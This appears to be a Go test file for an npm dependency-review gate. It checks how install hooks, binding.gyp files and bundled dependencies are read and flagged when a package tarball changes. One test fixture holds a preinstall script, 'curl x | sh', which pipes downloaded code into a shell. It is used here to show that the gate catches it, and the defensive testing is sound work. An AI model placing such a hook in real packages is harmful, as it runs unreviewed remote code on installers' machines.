package npm

import (
	"encoding/json/jsontext"
	"io/fs"
	"os"
	"strings"
	"testing"
	"testing/fstest"

	"github.com/sadbox/dep-review/internal/allow"
)

func TestReadHooks(t *testing.T) {
	tests := []struct {
		name, scripts string
		// want is the hooks as showHooks renders them; "error" for a
		// value that hides what would run.
		want string
	}{
		{"absent", ``, "none"},
		{"null", `null`, "none"},
		{"empty", `{}`, "none"},
		{"only other scripts", `{"test":"mocha","build":"tsc","prepare":"husky","prepublishOnly":"x"}`, "none"},
		{"postinstall", `{"postinstall":"node install.js"}`, `postinstall: "node install.js"`},
		{"all three", `{"preinstall":"a","install":"b","postinstall":"c"}`, `install: "b", postinstall: "c", preinstall: "a"`},
		{"an empty script is no script", `{"install":""}`, "none"},
		{"a null script is no script", `{"install":null}`, "none"},
		{"hook names are case sensitive", `{"PostInstall":"x","POSTINSTALL":"y"}`, "none"},
		{"a script that is a list", `{"install":["a"]}`, "error"},
		{"a script that is a number", `{"postinstall":1}`, "error"},
		{"a script that is an object", `{"preinstall":{"run":"x"}}`, "error"},
		{"scripts that is a string", `"node install.js"`, "error"},
		{"scripts that is a list", `["postinstall"]`, "error"},
		{"scripts that is true", `true`, "error"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hooks, err := readHooks(jsontext.Value(tt.scripts))
			got := "error"
			if err == nil {
				got = showHooks(hooks)
			}
			if got != tt.want {
				t.Errorf("readHooks(%s) = %s (%v), want %s", tt.scripts, got, err, tt.want)
			}
		})
	}
}

func TestTarballNoRegress(t *testing.T) {
	holds := allow.Yes("no install script; the old version has no provenance to lose"+notYetTarball, "registry and package-lock.json")
	pkg := func(manifest string, more ...string) fs.FS {
		m := fstest.MapFS{"package.json": {Data: []byte(manifest)}, "index.js": {Data: []byte("module.exports = 1\n")}}
		for _, name := range more {
			m[name] = &fstest.MapFile{Data: []byte("x")}
		}
		return m
	}
	const plain = `{"name":"a","version":"1.0.0","scripts":{"test":"mocha"}}`
	const withScript = `{"name":"a","version":"1.0.0","scripts":{"postinstall":"node install.js"}}`
	tests := []struct {
		name     string
		gathered allow.Fact
		old, new fs.FS
		// want is a piece of the Value; holds is whether the fact holds
		// afterwards.
		holds bool
		want  string
	}{
		{"no install step on either side", holds, pkg(plain), pkg(plain), true, "the tarball's package.json has no install script and there is no binding.gyp"},
		{"a new name with no install step", holds, nil, pkg(plain), true, "no install script and there is no binding.gyp"},
		{"the same script on both sides", holds, pkg(withScript), pkg(withScript), true, `the tarball's install scripts are unchanged (postinstall: "node install.js")`},
		{"a script and binding.gyp on both sides", holds, pkg(withScript, "binding.gyp"), pkg(withScript, "binding.gyp"), true, "binding.gyp as before"},
		{"the script is dropped", holds, pkg(withScript), pkg(plain), true, "no install script"},
		{"binding.gyp is dropped", holds, pkg(plain, "binding.gyp"), pkg(plain), true, "no install script"},

		// The tarball has what the registry's metadata did not show.
		{"a script only the tarball has", holds, pkg(plain), pkg(withScript), false, `the tarball's install scripts change from none to postinstall: "node install.js"`},
		{"the script changes", holds, pkg(withScript), pkg(strings.Replace(withScript, "install.js", "other.js", 1)), false, "the tarball's install scripts change"},
		{"a second hook appears", holds, pkg(withScript), pkg(`{"scripts":{"postinstall":"node install.js","preinstall":"curl x | sh"}}`), false, "the tarball's install scripts change"},
		{"binding.gyp appears", holds, pkg(plain), pkg(plain, "binding.gyp"), false, "the new tarball has a binding.gyp"},
		{"binding.gyp appears next to an old script", holds, pkg(withScript), pkg(withScript, "binding.gyp"), false, "the new tarball has a binding.gyp"},
		{"a new name with a script", holds, nil, pkg(withScript), false, "a new dependency whose tarball has an install script or a binding.gyp"},
		{"a new name with binding.gyp", holds, nil, pkg(plain, "binding.gyp"), false, "a new dependency whose tarball has an install script or a binding.gyp"},

		// Bundled dependencies, as only the bytes show them.
		{"bundleDependencies in package.json", holds, pkg(plain), pkg(`{"bundleDependencies":["b"]}`), false, "the new tarball bundles dependencies"},
		{"bundledDependencies in package.json", holds, pkg(plain), pkg(`{"bundledDependencies":["b"]}`), false, "the new tarball bundles dependencies"},
		{"bundleDependencies true", holds, pkg(plain), pkg(`{"bundleDependencies":true}`), false, "the new tarball bundles dependencies"},
		{"an empty bundleDependencies", holds, pkg(plain), pkg(`{"bundleDependencies":[]}`), true, "no install script"},
		{"a node_modules directory nobody declared", holds, pkg(plain), pkg(plain, "node_modules/b/package.json"), false, "the new tarball bundles dependencies"},

		// What cannot be read is a no.
		{"no package.json", holds, pkg(plain), fstest.MapFS{"index.js": {Data: []byte("x")}}, false, "the new tarball: no package.json at the tarball's root"},
		{"package.json one level down", holds, pkg(plain), fstest.MapFS{"package/package.json": {Data: []byte(plain)}}, false, "the new tarball: no package.json at the tarball's root"},
		{"package.json is not JSON", holds, pkg(plain), pkg(`{"scripts":`), false, "the new tarball: package.json is not JSON the gate can read"},
		{"package.json has scripts twice", holds, pkg(plain), pkg(`{"scripts":{},"scripts":{"postinstall":"x"}}`), false, "the new tarball: package.json is not JSON the gate can read"},
		{"a script that is not a string", holds, pkg(plain), pkg(`{"scripts":{"install":["x"]}}`), false, "the new tarball: the install script is not a string"},
		{"the old package.json is not JSON", holds, pkg(`nope`), pkg(withScript), false, "the old tarball: package.json is not JSON the gate can read"},
		{"no new tarball", holds, pkg(plain), nil, false, "the new tarball was not given"},

		// It never makes a fact better.
		{"a fact that does not hold stays as it is", allow.No("install scripts change", "registry"), pkg(plain), pkg(plain), false, "install scripts change"},
		{"an ungathered fact stays ungathered", allow.Fact{Value: "the registry did not answer"}, pkg(plain), pkg(plain), false, "the registry did not answer"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := TarballNoRegress(tt.gathered, tt.old, tt.new)
			if got.Holds() != tt.holds || !strings.Contains(got.Value, tt.want) {
				t.Errorf("TarballNoRegress = %+v, want holds %v saying %q", got, tt.holds, tt.want)
			}
			if !tt.gathered.Holds() && got != tt.gathered {
				t.Errorf("a fact that did not hold was changed: %+v -> %+v", tt.gathered, got)
			}
			if tt.gathered.Holds() {
				if !got.Gathered() {
					t.Errorf("the result is not a gathered fact: %+v", got)
				}
				if strings.Contains(got.Value, notYetTarball) {
					t.Errorf("the Value still says the tarball was not looked at: %q", got.Value)
				}
				if !strings.Contains(got.Source, "tarballs' package.json") {
					t.Errorf("the Source does not name the tarballs: %q", got.Source)
				}
			}
		})
	}
}

// TestTarballNoRegressOnDisk runs the check the way the artifact reader
// will: on an os.Root's file system.
func TestTarballNoRegressOnDisk(t *testing.T) {
	write := func(manifest string, more ...string) fs.FS {
		dir := t.TempDir()
		if err := os.WriteFile(dir+"/package.json", []byte(manifest), 0o600); err != nil {
			t.Fatal(err)
		}
		for _, name := range more {
			if err := os.WriteFile(dir+"/"+name, []byte("{}"), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		root, err := os.OpenRoot(dir)
		if err != nil {
			t.Fatal(err)
		}
		t.Cleanup(func() { root.Close() })
		return root.FS()
	}
	holds := allow.Yes("no install script"+notYetTarball, "registry")
	if got := TarballNoRegress(holds, write(`{"name":"a"}`), write(`{"name":"a"}`)); !got.Holds() {
		t.Errorf("two plain packages: %+v", got)
	}
	if got := TarballNoRegress(holds, write(`{"name":"a"}`), write(`{"name":"a"}`, "binding.gyp")); got.Holds() {
		t.Errorf("a new binding.gyp on disk: %+v", got)
	}
}
